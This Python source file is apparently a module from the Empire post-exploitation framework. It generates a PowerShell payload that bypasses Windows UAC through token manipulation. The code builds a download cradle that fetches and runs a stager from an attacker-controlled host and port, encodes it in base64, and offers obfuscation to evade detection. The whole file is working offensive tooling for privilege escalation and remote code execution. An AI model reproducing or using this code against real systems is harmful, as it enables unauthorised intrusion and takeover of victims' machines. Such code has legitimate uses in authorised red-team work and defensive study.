from __future__ import print_function

import pathlib
import base64
import re
from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        stager = params['Stager']
        host = params['Host']
        userAgent = params['UserAgent']
        port = params['Port']

        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/privesc/Invoke-BypassUACTokenManipulation.ps1"
        if main_menu.obfuscate:
            obfuscated_module_source = module_source.replace("module_source", "obfuscated_module_source")
            if pathlib.Path(obfuscated_module_source).is_file():
                module_source = obfuscated_module_source

        try:
            with open(module_source, 'r') as f:
                module_code = f.read()
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        if main_menu.obfuscate and not pathlib.Path(obfuscated_module_source).is_file():
            script = data_util.obfuscate(installPath=main_menu.installPath, psScript=module_code,
                                         obfuscationCommand=main_menu.obfuscateCommand)
        else:
            script = module_code

        try:
            blank_command = ""
            powershell_command = ""
            encoded_cradle = ""
            cradle = "IEX \"(new-object net.webclient).downloadstring('%s:%s/%s')\"|IEX" % (host, port, stager)
            # Remove weird chars that could have been added by ISE
            n = re.compile(u'(\xef|\xbb|\xbf)')
            # loop through each character and insert null byte
            for char in (n.sub("", cradle)):
                # insert the nullbyte
                blank_command += char + "\x00"
            # assign powershell command as the new one
            powershell_command = blank_command
            # base64 encode the powershell command

            encoded_cradle = base64.b64encode(powershell_command)

        except Exception as e:
            pass

        script_end = "Invoke-BypassUACTokenManipulation -Arguments \"-w 1 -enc %s\"" % (encoded_cradle)

        if main_menu.obfuscate:
            script_end = data_util.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=main_menu.obfuscateCommand)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
